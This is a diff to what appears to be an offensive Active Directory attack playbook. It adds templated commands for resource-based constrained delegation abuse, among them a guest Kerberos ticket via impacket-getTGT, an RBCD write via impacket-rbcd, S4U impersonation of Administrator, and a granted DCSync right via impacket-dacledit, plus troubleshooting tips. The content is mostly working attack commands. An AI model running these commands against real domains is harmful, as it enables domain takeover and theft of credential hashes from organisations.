@@ -44,6 +44,10 @@ skip `addcomputer` / MAQ entirely:
 
 ```
 bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add rbcd 'AD$' {{SPN_USER}}
+# empty-password guest instead? bloodyAD refuses -p '' — write via Impacket over Kerberos:
+#   impacket-getTGT -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}   (-> guest.ccache)
+#   export KRB5CCNAME=$PWD/guest.ccache
+#   impacket-rbcd -delegate-to 'AD$' -delegate-from {{SPN_USER}} -action write -k -no-pass {{DOMAIN}}/guest -dc-ip {{DC}}
 # getST as the SPN user. Pick the SPN by the goal:
 impacket-getST -spn ldap/{{DC_FQDN}} -impersonate Administrator \
   -dc-ip {{DC}} {{DOMAIN}}/{{SPN_USER}}:'{{PASS}}'      # ldap/ → DCSync grant
@@ -86,11 +90,15 @@ Only that host / that SPN. Useful after lsassy on a member.
 | Symptom | Next |
 | --- | --- |
 | `KRB_AP_ERR_SKEW` | `ntpdate -u {{DC}}`, rebuild |
+| getST / getTGT RST on VPN (small AS-REQ ok, TGS dies) | tun0 path-MTU — `ip link set dev tun0 mtu 1200` (`/opt/gotad/preflight.sh`); TGS-REQ carries the TGT and overflows the segment |
 | `KRB_AP_ERR_MODIFIED` | wrong SPN or hostname vs /etc/hosts |
 | golden ignored | wrong SID (must be the **domain** SID, not the machine) |
 | getST `S_PRINCIPAL_UNKNOWN` | SPN not on that computer. Use BH / findDelegation |
 | getST `KDC_ERR_BADOPTION` | RBCD principal has no SPN — use a Kerberoastable user, not a plain user |
 | got a ticket but DCSync grant fails | you requested `cifs/`; DCSync needs `ldap/{{DC_FQDN}}` |
+| bloodyAD missing for the grant | `impacket-dacledit -action write -rights DCSync -k -no-pass -dc-host {{DC_FQDN}}` (bloodyad.md) |
+| dacledit `KDC_ERR_PREAUTH_FAILED` with `-dc-ip` | drop `-dc-ip`, use `-dc-host {{DC_FQDN}}` matching the S4U SPN |
+| dacledit `-rights DCSYNC` rejected | case-sensitive: `-rights DCSync` |
 | Protected Users | no PTH, no RC4 sometimes. AES TGT / PKINIT |
 | extra-SID no EA | SID filtering on. Foreign group / ADCS / MSSQL instead |
 
